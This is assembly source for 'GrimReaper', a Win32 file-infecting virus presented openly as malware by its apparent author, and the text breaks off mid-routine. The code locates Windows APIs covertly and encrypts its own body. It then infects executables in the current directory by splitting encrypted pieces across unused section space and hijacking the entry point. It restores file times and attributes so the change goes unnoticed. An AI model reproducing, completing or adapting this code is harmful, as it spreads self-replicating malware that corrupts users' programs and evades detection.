; The first F5G virus : "GrimReaper"
; Author: Ripper (Fuckup5Group)
; Website: fuckup5group.hypermart.net
; Begin: aprox. 12/18/00
; Used assembler: TASM 5.0
;
; Editor info: use a editor where one tab sign is equal to 3 spaces
;					else it will be nearly unreadable
;
; Changes:
;  v4.4  PRE-ALPHA (released 06/04/01):
;   - documentation added (06/03/01)
;   - the virus got a name ;) (06/03/01)
;   - added 80h to the delta handle ebp to reduce virus size:
;     the size shrunk by >>>169 BYTES<<< to 2461 bytes !!!
;     that is under the 2474 bytes of v3.0 which didn't have virsections or
;		encryption :D
;  v4.3  PRE-ALPHA (released 05/18/01):
;	 - it's the first release with this header, so I'm unable to tell you any
;     changes to prior releases
;   - the virus has a size of 2630 bytes
;
; Virus size and bait size addition history:
;  (with bait size addition I mean the growth of a bait file after infection.
;	 the first bait file is a minimal programm written in asm just calling
;	 MessageBoxA and ExitProcess so that there is a lot of unused space in it.
;   the second bait file is the same written in cpp with as good as no unused
;   space (even debug infos are included))
;
;	v?.?-1.3		unknown (no backups, overwritten)
;	v1.4  =	2386 bytes		+ 5632 bytes	+ 6297 bytes (nothing! just infection)
;	v1.5  =	2270 bytes		+ 5632 bytes	+ 6297 bytes
;
;	v2.0-3		unknown (no backups, overwritten)
;	v2.4  =  2577 bytes		+ 6144 bytes   + 6809 bytes (no unused, but encrypt)
;	(very interesting values! seems to be a big bug I didn't recognize that time)
;  (oh, I've got it: I added the virus behind fileoffset + virtual size of the
;   last section instead of fileoffset + raw size! so it's clear that it has to
;   be a little bit bigger than it should be)
;
;  v3.0  =	2474 bytes		+ 1536 bytes  	+ 2713 bytes (no virsecs,no encrypt)
;  v3.1  =	3095 bytes		+ 1536 bytes  	+ 2713 bytes (no encryption)
;
;  v4.0	=	3330 bytes		+ 1536 bytes  	+ 2713 bytes
;  v4.1	=	2916 bytes		+ 1024 bytes  	+ 2201 bytes
;  v4.2  =	2904 bytes		+ 1024 bytes  	+ 1689 bytes (added 1 virsection)
;  v4.3  =  2630 bytes     +  512 bytes  	+ 1689 bytes
;  v4.4  =  2461 bytes     +  512 bytes  	+ 1689 bytes
;
;
; Todo:
;  - I'm going to try to use the free space between the data directory and the
;    first section. This should bring me to the long awaited +    0 bytes in the
;    first bait size addition column if it doesn't take to much code...
;  - still a payload is needed
;  - perhaps something polymorphic but I don't think this will come into this
;    virus
;  - another infection check cause the "GR" in the MZ header is too easy too
;    discover
;
; THIS IS A PRE-RELEASE VERSION!!!! USE AT OWN RISK!!!
; >YOU< ARE RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS PROGRAMM!!!
;
; When assembling, don't forget to make the codesegment writable
; (set the dword at offset 0000021C to C0000040)

.386p
.model flat

extrn		ExitProcess:PROC
extrn		GetModuleHandleA:PROC

.data
	db 0

.code

start:

	;	get delta handle without making avps paying attention to it

	call 	GetDeltaHandle2
GetDeltaHandle:
	mov	ecx,offset section1end-cryptstart
	sub	ebp,offset GetDeltaHandle-offset start-80h
	cmp	ebp,offset start+80h
	je		cryptstart                                  ; first generation ?

	lea	edi,[ebp+offset cryptstart-offset start-80h]    ; no -> decrypt
	mov	eax,[ebp+offset randomkey-offset start-80h]

	call	crypt

	jmp	cryptstart

GetDeltaHandle2:
	mov	ebp,esp                              ; pretend to be a normal function
	lea	esi,[ebp+4]
	mov	ebp,[esi-4]                          ; get offset of GetDeltaHandle
	ret

; crypt routine
;
; eax = Encryption key
; edi = ptr to data to be en- or decrypted
; ecx = size of data to be en- or decrypted
crypt:
	rol	eax,17
	sub	ecx,4

crypt32loop:
	xor	dword ptr [edi],eax
	add	eax,001010101h
	ror	eax,3
	add	edi,4
	sub	ecx,4
	jns	crypt32loop
	add	ecx,4
	je		cryptdone

crypt8loop:
	xor	byte ptr [edi],al
	shr	eax,8
	inc	edi
	dec	ecx
	jne	crypt8loop

cryptdone:
	ret

randomkey				dd 0

cryptstart:                               ; here starts the encryption
	jmp 	RealStart

imagebase				dd 0400000h
mapaddress				dd 0
filehandle				dd 0

; information about the virus pieces in the file are stored here

SECTIONNUM				= 4

firstoffset				dd 0		;offset section1end
firstsize				dd	0		;(offset end-offset section1end)
firstdelta				dd 0

							dd 0
							dd 0
							dd 0

							dd 0
							dd 0
							dd 0

							dd 0
							dd 0
							dd 0

							dd 0

; other stuff (sorted "by how often" it is used [excellent english,isn't it?])

oldip						dd 0
PEheader					dd 0
maxsize					dd 0
oldrawsize				dd 0
add2imagesize			dd 0
delta						dd 0
infectionflag			dw 0
unusedsize				dd	0
vxmemptr					dd 0

kernel32 	   		dd 0
limit 		   		dd 0
AddFunc 					dd 0
AddName 		   		dd 0
AddOrd 					dd 0
Nindex					dd 0

filealign				dd 0
fileofs					dd 0
fileattributes			dd 0

ftcreation				dq 0            ; file times
ftlastwrite				dq 0
ftlastaccess			dq 0

newfilesize				dd 0
memory					dd 0

maphandle				dd 0

sectionalign			dd 0

newip						dd 0


maxoffset				dd 0

gmhptr					dd 0
gmh 						db "GetModuleHandleA",0
gmhsize 					= $ - gmh
k32 						db "KERNEL32.DLL",0

; The api functions

FirstKERNELAPIName:
AExitProcess			db "ExitProcess",0
AGetProcAddress		db "GetProcAddress",0
ALoadLibrary			db "LoadLibraryA",0
AFreeLibrary			db "FreeLibrary",0
;AGetWindowsDirectory db "GetWindowsDirectoryA",0
;AGetSystemDirectory 	db "GetSystemDirectoryA",0
;AGetCurrentDirectory db "GetCurrentDirectoryA",0
;ASetCurrentDirectory db "SetCurrentDirectoryA",0
AFindFirstFile			db "FindFirstFileA",0
AFindNextFile			db "FindNextFileA",0
AGetFileAttributes	db "GetFileAttributesA",0
ASetFileAttributes	db "SetFileAttributesA",0
ACreateFile				db "CreateFileA",0
AGetFileTime			db "GetFileTime",0
;AGetFileSize			db "GetFileSize",0
ACreateFileMapping	db "CreateFileMappingA",0
AMapViewOfFile			db "MapViewOfFile",0
AUnmapViewOfFile		db "UnmapViewOfFile",0
ACloseHandle			db "CloseHandle",0
ASetFilePointer		db "SetFilePointer",0
ASetEndOfFile			db "SetEndOfFile",0
ASetFileTime			db "SetFileTime",0
AGlobalAlloc			db "GlobalAlloc",0
AGlobalFree				db	"GlobalFree",0

							db 0

FirstUSER32APIName:
AMessageBox				db "MessageBoxA",0
							db 0

FirstKERNELAPIAddress:
AExitProcessA				dd 0
AGetProcAddressA     	dd 0
ALoadLibraryA				dd 0
AFreeLibraryA				dd 0
;AGetWindowsDirectoryA 	dd 0
;AGetSystemDirectoryA 	dd 0
;AGetCurrentDirectoryA 	dd 0
;ASetCurrentDirectoryA 	dd 0
AFindFirstFileA		  	dd 0
AFindNextFileA				dd 0
AGetFileAttributesA     dd 0
ASetFileAttributesA     dd 0
ACreateFileA            dd 0
AGetFileTimeA           dd 0
;AGetFileSizeA				dd 0
ACreateFileMappingA     dd 0
AMapViewOfFileA         dd 0
AUnmapViewOfFileA       dd 0
ACloseHandleA           dd 0
ASetFilePointerA        dd 0
ASetEndOfFileA          dd 0
ASetFileTimeA           dd 0
AGlobalAllocA				dd 0
AGlobalFreeA				dd 0

FirstUSER32APIAddress:
AMessageBoxA			dd 0

FirstLibName:
usr32						db "USER32.DLL",0

FirstLibAddress:
user32					dd ?

infections				dd 0
exestr					db "tester*.exe",0       ; the file filter

; win32_find_data structure

max_path					= 260

filetime					STRUC
	FT_dwLowDateTime	DD ?
	FT_dwHighDateTime	DD ?
filetime					ENDS

win32_find_data		STRUC
	FileAttributes		DD ?
	CreationTime		filetime ?
	LastAccessTime		filetime ?
	LastWriteTime		filetime ?
	FileSizeHigh		DD ?
	FileSizeLow			DD ?
	Reserved0			DD ?
	Reserved1			DD ?
	FileName				DB max_path DUP (?)
	AlternateFileName	DB 13 DUP (?)
							DB 3 DUP (?)
win32_find_data		ENDS

searchptr				dd 0                    ; pointer to the search struct

viruslen					= end-start

;MsgTitle					db "You are getting infected!",0
;MsgText 					db "This is MY message box!",0

RealStart:
	;
	;	Check my surroundings
	;
	mov esi,[ebp+offset imagebase-offset start-80h]
	cmp word ptr [esi],'ZM'     						; is "MZ"?
	jne getouttahere
	add esi,03ch                						; pointer to new header addr
	mov esi,[esi]											; get new header address
	add esi,[ebp+offset imagebase-offset start-80h]	; align it
	cmp word ptr [esi],'EP'     						; is "PE"?
	jne getouttahere

	cmp	ebp,offset start+80h
	jne	notfirstgen
														; tasm gives an error when writen so :
;	lea	eax,[ebp+offset GetModuleHandleA-offset start-80h]
	lea	eax,[ebp+offset GetModuleHandleA-00401000h-80h]
	jmp	callit

notfirstgen:
	mov	eax,[ebp+offset gmhptr-offset start-80h];get address of GetModuleHandle
	mov	eax,[eax]
	or		eax,eax
	je		getouttahere									 ; is NULL ? -> fuck you!

callit:
	lea edx,[ebp+offset k32-offset start-80h]     ; get module handle of KERNEL32
	push edx
	call eax
	or eax,eax
	jne found

	mov eax,0bff70000h               		; couldn't get it? -> hardcode address

found:
	mov [ebp+offset kernel32-offset start-80h],eax   ; check if it's really a PE
	mov edi,eax
	cmp word ptr [edi],'ZM'
	jne getouttahere
	mov edi,[edi+03ch]
	add edi,eax
	cmp word ptr [edi],'EP'
	jne getouttahere

	pushad                                       ; ok it "should be" KERNEL32
	mov	edx,eax                                ; ptr to kernel32
	mov	esi,[edi+078h]                         ; get ptr to export directory
	lea	edi,[ebp+offset limit-offset start-80h]
	lea	esi,[esi+edx+18h]                      ; point to num. of names
	movsd                                        ; get it
	lodsd                                        ;
	add eax,edx                                  ;
	stosd														; get ptr to funcofslist:AddFunc
	lodsd
	add eax,edx
	stosd														; get ptr to nameofslist:AddName
	lodsd
	add eax,edx
	stosd														; get ptr to nameordlist:AddOrd
	mov eax,[ebp+offset AddName-offset start-80h]; get first pointer to a name
	stosd														; save it into Nindex

	; search for GetProcAddress so that the other api functions
	; can be found with that function

	mov edi,[eax]
	add edi,edx
	xor ecx,ecx
	lea ebx,[ebp+offset AGetProcAddress-offset start-80h]

	; find name in name list

tryagain:
	mov esi,ebx

matchbyte:
	cmpsb
	jne nextone

	cmp byte ptr [edi],0
	je gotit
	jmp matchbyte

nextone:
	inc ecx
	cmp ecx,dword ptr [ebp+offset limit-offset start-80h]
	jge getouttahere

	add dword ptr [ebp+offset Nindex-offset start-80h],4   ; get next pointer rva
	mov esi,[ebp+offset Nindex-offset start-80h]
	mov edi,[esi]
	add edi,edx
	jmp tryagain

	; name found -> get function entry point

gotit:
	lea ebx,[esi+1]
	add ecx,ecx
	mov esi,[ebp+offset AddOrd-offset start-80h]
	add esi,ecx
	xor eax,eax
	mov ax,word ptr [esi]
	shl eax,2
	mov esi,[ebp+offset AddFunc-offset start-80h]
	add esi,eax
	mov edi,dword ptr [esi]
	add edi,edx
	mov [ebp+offset AGetProcAddressA-offset start-80h],edi
	popad

	; get other KERNEL32 api functions' addresses

	lea edi,[ebp+offset FirstKERNELAPIName-offset start-80h]
	lea esi,[ebp+offset FirstKERNELAPIAddress-offset start-80h]
	mov ebx,[ebp+offset kernel32-offset start-80h]
	call GetAPIFuncs
	or eax,eax
	jne getouttahere

	; use LoadLibrary to load USER32 for the MessageBox funcion

	lea eax,[ebp+offset usr32-offset start-80h]
	push eax
	mov eax,[ebp+offset ALoadLibraryA-offset start-80h]
	call eax
	or	eax,eax
	je getouttahere
	mov [ebp+offset user32-offset start-80h],eax

	; get needed USER32 api functions

	lea edi,[ebp+offset FirstUSER32APIName-offset start-80h]
	lea esi,[ebp+offset FirstUSER32APIAddress-offset start-80h]
	mov ebx,[ebp+offset user32-offset start-80h]
	call GetAPIFuncs
	or eax,eax
	jne getouttahere2

	; this "payload" was commented out to reduce needed diskspace ;)
	; it will be changed soon (like making it dependent on the number of
	; infections being made yet on this computer or something like this...)

;	push 0
;	lea ecx,[ebp+offset MsgTitle-offset start-80h]
;	push ecx
;	lea ecx,[ebp+offset MsgText-offset start-80h]
;	push ecx
;	push 0
;	mov eax,[ebp+offset AMessageBoxA-offset start-80h]
;	call eax

	cmp ebp,offset start+80h
	je	nosecinit                                    ; first generation ?

	; no -> put virus pieces together again

	call	InitOtherVxSecs

	; infect directories

	mov	eax,[ebp+offset vxmemptr-offset start-80h]
	add	eax,offset Infect_directories-offset start

	call	eax

	; and free up the memory space needed by the pieces

	push	dword ptr [ebp+offset vxmemptr-offset start-80h]
	mov	eax,[ebp+offset AGlobalFreeA-offset start-80h]
	call	eax

	jmp	getouttahere2

nosecinit:                               ; yes -> no sections -> just call it
	call	Infect_directories

getouttahere2:
	push dword ptr [ebp+offset user32-offset start-80h]
	mov eax,[ebp+offset AFreeLibraryA-offset start-80h]
	call eax

getouttahere:
	cmp ebp,offset start+80h
	je exitnow                                       ; first generation ?
	mov eax,[ebp+offset oldip-offset start-80h]      ; no -> call old entry point
	add eax,[ebp+offset imagebase-offset start-80h]
	jmp eax

exitnow:                                            ; yes -> exit programm
	push 0
	mov eax,[ebp+offset AExitProcessA-offset start-80h]
	call eax

; api function address "getter"
;
; ebx = library handle
; edi = address of first API name
; esi = address of first receiving API address
GetAPIFuncs:
	push ecx
	push edx
nextAPIFunc:
	push edi
	push ebx
	mov eax,[ebp+offset AGetProcAddressA-offset start-80h]
	call eax
	or eax,eax
	je GAFerror
	mov [esi],eax
	add esi,4
	xor eax,eax
	mov ecx,128
	repnz scasb                                 ; go to next name
	cmp byte ptr [edi],0                        ; was it the last one?
	jne nextAPIFunc

	pop edx
	pop ecx
	ret

GAFerror:
	inc eax
	pop edx
	pop ecx
	ret

; function to put the pieces of the virus distributed all over in the executable
; into one piece, so that it can be executed

InitOtherVxSecs:

	; allocate memory where the pieces can be put together

	push	viruslen
	push	0
	mov	eax,[ebp+offset AGlobalAllocA-offset start-80h]
	call	eax
	or		eax,eax                               ; Could I allocate needed memory?
	je		getouttahere2                         ; No -> rrrrrrrrausssssss

	mov	[ebp+offset vxmemptr-offset start-80h],eax

	; copy first section into that space

	mov	edi,eax
	lea	esi,[ebp+offset start-offset start-80h]
	mov	ecx,offset section1end-offset start
	rep	movsb

	; go through section list, copy the pieces into the memory space
	; and decrypt it

	lea	edx,[ebp+offset firstoffset-offset start-80h]
	xor	eax,eax
nextsec:
	mov	esi,[edx]                                 ; address of section
	or		esi,esi
	je		allsecscopied
	mov	ecx,[edx+4]                               ; length of section
	rep	movsb                                     ; copy it

	mov	ecx,[edx+4]
	sub	edi,ecx
	mov	eax,[ebp+offset randomkey-offset start-80h]
	call	crypt                                     ; decrypt it

;	mov	ebx,edi
;	mov	edi,[edx]
;	mov	ecx,[edx+4]
;	rep	stosb                         ; clear used file sections
;	mov	edi,ebx                       ; doesn't work: some are write protected!
;	add	edx,8

	add	edx,12                                    ; go to next section
	jmp	nextsec

allsecscopied:
	ret                                             ; done

section1end:

; here ends the first section which is ALWAYS in one piece appended
; to the last filesection. the following code will be put depending of the
; victim into totally different pieces. so this will be fully executed in
; the allocated memory except in case it's the first generation...

Infect_directories:
	push	ebp
	call  GetDeltaHandle2                           ; get new delta handle
GetDeltaHandle3:
	sub	ebp,offset GetDeltaHandle3-offset start-80h

	; allocate memory for the search structure

	push	320
	push	0
	mov	eax,[ebp+offset AGlobalAllocA-offset start-80h]
	call	eax
	or		eax,eax
	je		memerror
	mov	[ebp+offset searchptr-offset start-80h],eax

	; infect ONE file in the current directory

	mov	dword ptr [ebp+offset infections-offset start-80h],1
	call	infect_current_dir

	; free search struct memory

	push	dword ptr [ebp+offset searchptr-offset start-80h]
	mov	eax,[ebp+offset AGlobalFreeA-offset start-80h]
	call	eax

memerror:
	pop	ebp
	ret

; search for <infections> file with <exestr> filter in current directory
; and infect it

infect_current_dir:
	mov edi,[ebp+offset searchptr-offset start-80h]
	push edi
	lea eax,[ebp+offset exestr-offset start-80h]
	push eax
	mov eax,[ebp+offset AFindFirstFileA-offset start-80h]
	call eax
	inc eax
	jz no_files
	dec eax
	push eax

TryInfection:
	lea esi,[edi.FileName]
	mov ecx,[edi.FileSizeLow]
	call Infect_File                                       ; GO GO GO!!!
	jc Another_file
	dec dword ptr [ebp+offset infections-offset start-80h]
	je All_done

Another_file:
	push edi                                               ; delete old filename
	lea edi,[edi.FileName]
	mov ecx,13
	xor al,al
	rep stosb
	pop edi
	pop eax
	push eax
	push edi
	push eax
	mov eax,[ebp+offset AFindNextFileA-offset start-80h]   ; get next filename
	call eax
	or eax,eax
	jne TryInfection

All_done:
	pop eax
no_files:
	ret

; this is the main infection routine

Infect_File:
	pushad

	mov dword ptr [ebp+newfilesize-offset start-80h],ecx
	mov word ptr [ebp+infectionflag-offset start-80h],0
	add ecx,viruslen+1000h                    				; some extra work space
	mov [ebp+offset memory-offset start-80h],ecx

	; backup fileattributes and set them to normal because of possible write
	; protection etc.

	mov [ebp+offset fileofs-offset start-80h],esi			 ; pointer to filename
	push esi
	mov eax,[ebp+AGetFileAttributesA-offset start-80h]
	call eax
	or	eax,eax
	mov [ebp+fileattributes-offset start-80h],eax          ; backup attributes

	push 80h
	push esi
	mov eax,[ebp+offset ASetFileAttributesA-offset start-80h]
	call eax

	; open the victim

	push 0														; file template
	push 0														; file attributes
	push 3														; open existing file
	push 0														; security option = default
	push 1														; file share for read
	push 0c0000000h											; general write and read
	push esi														; filename
	mov eax,[ebp+offset ACreateFileA-offset start-80h]
	call eax

	mov [ebp+offset filehandle-offset start-80h],eax
	cmp eax,-1
	je infection_error

	; save old filetimes

	lea ebx,[ebp+offset ftcreation-offset start-80h]
	push ebx
	add ebx,8
	push ebx
	add ebx,8
	push ebx
	push eax
	mov ebx,[ebp+AGetFileTimeA-offset start-80h]
	call ebx

	; create a mapping of the file

	push 0                            							; filename handle=NULL
	push dword ptr [ebp+offset memory-offset start-80h]   ; max size
	push 0																; min size
	push 4																; page read & write
	push 0																; security attrs
	push dword ptr [ebp+offset filehandle-offset start-80h]
	mov eax,[ebp+offset ACreateFileMappingA-offset start-80h]
	call eax

	mov [ebp+offset maphandle-offset start-80h],eax
	or eax,eax
	je close_file

	; map a view of the file into memory

	push dword ptr [ebp+offset memory-offset start-80h]; bytes to map
	push 0															; low file offset
	push 0                                    			; hight file offset
	push 2															; file map read/write mode
	push eax															; file map handle
	mov eax,[ebp+offset AMapViewOfFileA-offset start-80h]
	call eax

	or eax,eax
	je close_map
	mov esi,eax
	mov [ebp+offset mapaddress-offset start-80h],esi

	; check if it's a PE and if it's already infected

	cmp word ptr [esi],'ZM'
	jne Unmap_view
	cmp word ptr [esi+38h],'RG'                        ; very cheap
	jne ok_go
	dec word ptr [ebp+infectionflag-offset start-80h]
	jmp Unmap_view

ok_go:
	mov ebx,dword ptr [esi+03ch]
	add esi,ebx                                        ; esi points now to pehead
	cmp word ptr [esi],'EP'
	jne Unmap_view

	lea	edi,[ebp+offset firstoffset-offset start-80h]   ; reset virsection data
	mov	ecx,10
	xor	eax,eax
	rep	stosd
	mov	dword ptr [ebp+offset firstoffset-offset start-80h+12*(SECTIONNUM-1)],1

	mov 	[ebp+offset PEheader-offset start-80h],esi
	mov 	eax,[esi+28h]
	push	dword ptr [ebp+offset oldip-offset start-80h]      ; save own oldip
	mov 	[ebp+offset oldip-offset start-80h],eax

	push	dword ptr [ebp+offset imagebase-offset start-80h]	; save own imagebase
	mov	eax,[esi+34h]
	mov	[ebp+offset imagebase-offset start-80h],eax

	mov	eax,[esi+38h]
	mov	[ebp+offset sectionalign-offset start-80h],eax

	mov 	eax,[esi+3ch]
	mov 	[ebp+offset filealign-offset start-80h],eax

	xor	ecx,ecx
	mov	dword ptr [ebp+offset add2imagesize-offset start-80h],ecx

	;
	; Check import dir for GetModuleHandle
	;

	mov	edx,[esi+84h]								; imp dir size
	mov	edi,[esi+80h]                       ; imp dir addr

	; search for import directory in the victim file

	mov	cx,[esi+6]									; num of secs
	mov	eax,[esi+74h]								; num of dir entries
	shl	eax,3
	add	esi,78h
	add	esi,eax

	; search for a section where is
	;  virtualaddr<=impdiraddr && virtualaddr+size>=impdiraddr+impdirsize

nextsecchk:
	mov	eax,[esi+0ch]                       ; virtual address
	cmp	eax,edi
	jbe	firstcondok
notok:
	add	esi,28h
	dec	ecx
	je    didntfoundit
	jmp	nextsecchk
firstcondok:
	add	eax,[esi+10h]                       ; size of raw data
	cmp	eax,edi
	jna	notok

	; calculate fileoffset of import directory

	mov	ecx,[ebp+offset mapaddress-offset start-80h]
	add	ecx,[esi+14h]
	sub	ecx,[esi+0ch]
	add	edi,ecx

	mov	esi,edi										; ptr to begin of imp dir
	mov	ebx,edx                             ; backup imp dir size
	add	edx,esi                             ; ptr to end of imp dir

	; search for KERNEL32 imports

nextimpdirentry:
	mov	eax,[esi+0ch]
	add	eax,ecx
	cmp	dword ptr [eax],'NREK'
	je		foundit
	add	esi,014h
	cmp	esi,edx
	jl		nextimpdirentry
	jmp	didntfoundit

foundit:
	mov	esi,[esi+10h]           ; use RVAFuncionAddressList instead of NameList
	or		esi,esi
	je		didntfoundit

	add	esi,ecx
	mov	edx,esi
	mov	eax,ebx

	; search for the GetModuleFunction function

lookloop:
	cmp	dword ptr [edx],0
	je		didntfoundit
	cmp	byte ptr [edx+3],80h
	je		nothere
	mov	esi,[edx]
	push	ecx
	add	esi,ecx
	add	esi,2
	lea	edi,[ebp+offset gmh-offset start-80h]
	mov	ecx,gmhsize
	rep	cmpsb
	pop	ecx
	je		foundgmh

nothere:
	add	edx,4
	dec	eax
	jne	lookloop

didntfoundit:                                ; not found -> infection impossible
	pop	dword ptr [ebp+offset imagebase-offset start-80h]
	pop	dword ptr [ebp+offset oldip-offset start-80h]
	jmp	Unmap_view

foundgmh:

	; store its address in gmhptr

	add	edx,[ebp+offset imagebase-offset start-80h]
	sub	edx,ecx
	mov	[ebp+offset gmhptr-offset start-80h],edx

	mov	esi,[ebp+offset PEheader-offset start-80h]

	;
	; calculate how the virus should be put into the victim
	;

	; calculate file offset of last section

	mov ebx,[esi+74h]                         ; num of dir entries(each 8 byte)
	shl ebx,3
	xor eax,eax
	mov ax,word ptr [esi+6h]						; num of sections(each 28 byte)
	dec eax
	mov ecx,28h
	mul ecx
	add esi,78h											; dir table offset
	add esi,ebx
	add esi,eax                     ; esi is now pointing at last sections offset

	or dword ptr [esi+24h],0a0000020h			; set sec flags for code,exec,write
	mov ecx,[esi+10h]									; raw data size
	mov [ebp+offset oldrawsize-offset start-80h],ecx

	; count number of unused bytes(00 bytes) in the last section

	mov	edi,[esi+14h]                       ; raw data fileoffset
	add	edi,[ebp+offset mapaddress-offset start-80h]
	add	edi,ecx
	dec	edi                                 ; edi -> last byte of last section
	std
	xor	eax,eax
	repz	scasb
	cld
	mov	eax,[ebp+offset oldrawsize-offset start-80h]
	dec	eax
	sub	eax,ecx
	mov	[ebp+offset unusedsize-offset start-80h],eax

	mov	ebx,viruslen
	cmp	eax,ebx                           ; is enough room in unused raw data ?
	jae	vxinraw

	sub	ebx,eax                             				 ; no, calc rest needed

	cmp	eax,offset section1end-offset start
	jae	sec1inraw                ; is enough room for sec1 in unused raw data ?

	neg	eax                      ; no, add rest of sec1 to last sec (only size)
	add	eax,offset section1end-offset start
	add	[esi+10h],eax
	sub	ebx,eax													  ; ebx is the rest needed

sec1inraw:

	; search for unused space in all file sections and store infos about 'em

	lea	edx,[ebp+offset firstoffset-offset start-80h]

whatsyouwantloop:
	call	GetBiggestUnusedSpace

	mov	[edx],edi
	mov	[edx+4],ecx
	mov	[edx+8],eax

	cmp	ebx,ecx
	ja		ineedmore

	mov	[edx+4],ebx                                    ; set last size to ebx
	jmp	imsatisfied

ineedmore:
	sub	ebx,ecx

	add	edi,ecx
	add	edx,12
	mov	byte ptr [edi-1],1							        ; mark as used
	cmp	dword ptr [edx],1
	jne	whatsyouwantloop

ineedmore2:

	; the remaining rest will be added to the last section after the first
	; virus section

	mov	edi,[esi+14h]                                  ; fileoffset
	add	edi,[ebp+offset mapaddress-offset start-80h]
	add	edi,[esi+10h]                                  ; raw size
	mov	[edx],edi                                      ; virsec offset

	mov	[edx+4],ebx                                    ; virsec size = rest

	; calculate delta value between virsec offset in virmem(mapaddress) and
	; the one in executed memory(imagebase)

	mov	eax,[esi+0ch]                                  ; virtual addr
	sub	eax,[esi+14h]                                  ; fileoffset
	sub	eax,[ebp+offset mapaddress-offset start-80h]
	add	eax,[ebp+offset imagebase-offset start-80h]
	mov	[edx+8],eax                                    ; virsec delta

	add	[esi+10h],ebx                                  ; add rest to raw size
	mov	eax,[esi+10h]

imsatisfied:

	; align raw data size to filealign

	xor	edx,edx
	mov	ecx,[ebp+offset filealign-offset start-80h]
	div	ecx
	sub	ecx,edx
	add	[esi+10h],ecx
	mov	eax,[esi+10h]

	cmp	eax,[esi+8h] 							 ; raw data bigger than virtual size ?
	jbe	rawinvirtual

	mov	[esi+8h],eax                      ; yes -> set it to raw size

; Align virtual size to sectionalign

	mov	ecx,[ebp+offset sectionalign-offset start-80h]
	div	ecx
	sub	ecx,edx
	add	[esi+8h],ecx
	mov	[ebp+offset add2imagesize-offset start-80h],ecx

vxinraw:
rawinvirtual:

	; calculate the new entry point for the victim

	mov eax,[esi+0ch]												; virtual address
	add eax,[ebp+offset oldrawsize-offset start-80h]
	sub eax,[ebp+offset unusedsize-offset start-80h]	; sub unused raw data size
	mov [ebp+offset newip-offset start-80h],eax

	; calculate the new size of the file

	mov eax,[esi+14h]												; file offset of rawdata
	add eax,[esi+10h]												; add new raw data size
	mov [ebp+offset newfilesize-offset start-80h],eax

	; calculate random key

	call	random32
	push	dword ptr [ebp+offset randomkey-offset start-80h] ; save own random key
	mov	dword ptr [ebp+offset randomkey-offset start-80h],eax

	;
	; copy the virus into the victim
	;

	; copy section 2 into calced pieces

	push	esi

	lea	esi,[ebp+offset section1end-offset start-80h]
	lea	edx,[ebp+offset firstoffset-offset start-80h]

copynextpcs:
	mov	edi,[edx]                                    ; virsec offset
	or		edi,edi
	je		notapiece
	mov	ecx,[edx+4]                                  ; virsec size
	rep	movsb                                        ; copy it

	mov	edi,[edx]
	mov	ecx,[edx+4]
	mov	eax,[ebp+offset randomkey-offset start-80h]
	call	crypt                                        ; encrypt it

	mov	eax,[edx+8]                                  ; virsec delta
	add	[edx],eax                                    ; change offset
	add	edx,12                                       ; go to next virsec
	jmp	copynextpcs

notapiece:
	pop	esi

	; calculate virus destination address

;	mov edi,[esi+14h]                         			; file offset of rawdata
;	add edi,[ebp+offset oldrawsize-offset start-80h]
;	sub edi,[ebp+offset unusedsize-offset start-80h]
;	add edi,[ebp+offset mapaddress-offset start-80h]

	mov edi,[ebp+offset newip-offset start-80h]
	sub edi,[esi+0ch]                                  ; virtual address
	add edi,[esi+14h]                                  ; file offset of rawdata
	add edi,[ebp+offset mapaddress-offset start-80h]

	; copy first virus section

	lea 	esi,[ebp+offset start-offset start-80h]
	push	edi
	mov	ecx,offset section1end-offset start
	rep 	movsb

	pop	edi
	mov	eax,[ebp+offset randomkey-offset start-80h]
	add	edi,offset cryptstart-offset start

	pop	dword ptr [ebp+offset randomkey-offset start-80h]  ; restore stuff
	pop	dword ptr [ebp+offset imagebase-offset start-80h]
	pop	dword ptr [ebp+offset oldip-offset start-80h]

	mov	ecx,offset section1end-offset cryptstart
	call	crypt                                         		; encrypt it

	; write new eip to PE header

	mov esi,[ebp+offset PEheader-offset start-80h]
	mov eax,[ebp+offset newip-offset start-80h]
	mov [esi+28h],eax

	; increase size of image

	mov eax,[ebp+offset add2imagesize-offset start-80h]
	add [esi+50h],eax

	; mark as infected

	mov esi,[ebp+offset mapaddress-offset start-80h]
	mov word ptr [esi+38h],'RG'

	;
	; end the infection
	;

Unmap_view:
	push dword ptr [ebp+offset mapaddress-offset start-80h]
	mov eax,[ebp+AUnmapViewOfFileA-offset start-80h]
	call eax

close_map:
	push dword ptr [ebp+offset maphandle-offset start-80h]
	mov eax,[ebp+ACloseHandleA-offset start-80h]
	call eax

close_file:

	; set file pointer to end of file

	push 0
	push 0
	push dword ptr [ebp+offset newfilesize-offset start-80h]
	push dword ptr [ebp+offset filehandle-offset start-80h]
	mov eax,[ebp+offset ASetFilePointerA-offset start-80h]
	call eax

	; mark end of file

	push dword ptr [ebp+offset filehandle-offset start-80h]
	mov eax,[ebp+offset ASetEndOfFileA-offset start-80h]
	call eax

	; restore file times

	lea ebx,[ebp+offset ftcreation-offset start-80h]
	push ebx
	add ebx,8
	push ebx
	add ebx,8
	push ebx
	push dword ptr [ebp+offset filehandle-offset start-80h]
	mov ebx,[ebp+ASetFileTimeA-offset start-80h]
	call ebx

	; close the file

	push dword ptr [ebp+offset filehandle-offset start-80h]
	mov eax,[ebp+ACloseHandleA-offset start-80h]
	call eax

	; restore old file attributes

	push dword ptr [ebp+offset fileattributes-offset start-80h]
	push dword ptr [ebp+offset fileofs-offset start-80h]
	mov eax,[ebp+offset ASetFileAttributesA-offset start-80h]
	call eax

	cmp word ptr [ebp+offset infectionflag-offset start-80h],0ffffh
	je  infection_error
	clc
	popad
	ret

infection_error:
	stc
	popad
	ret

; searches all section for unused space at the end of each and returns
; the biggest space found

GetBiggestUnusedSpace:
	pushad

	xor 	ecx,ecx
	mov	dword ptr [ebp+offset maxoffset-offset start-80h],ecx
	mov	dword ptr [ebp+offset maxsize-offset start-80h],ecx
	mov	dword ptr [ebp+offset delta-offset start-80h],ecx

	; calculate offset to the first section header

	mov	esi,[ebp+offset PEheader-offset start-80h]
	mov 	ebx,[esi+74h]                         ; num of dir entries(each 8 byte)
	shl 	ebx,3
	mov 	cx,word ptr [esi+6h]						  ; num of sections(each 28h byte)
	dec	ecx                                   ; don't search in last section
	add 	esi,78h										  ; dir table offset
	add 	esi,ebx

	; check each section

trynextsec:
	push	ecx
	mov	ecx,[esi+10h]
	mov	edi,[esi+14h]
	add	edi,[ebp+offset mapaddress-offset start-80h]
	add	edi,ecx
	dec	edi
	std
	xor	eax,eax
	repz	scasb
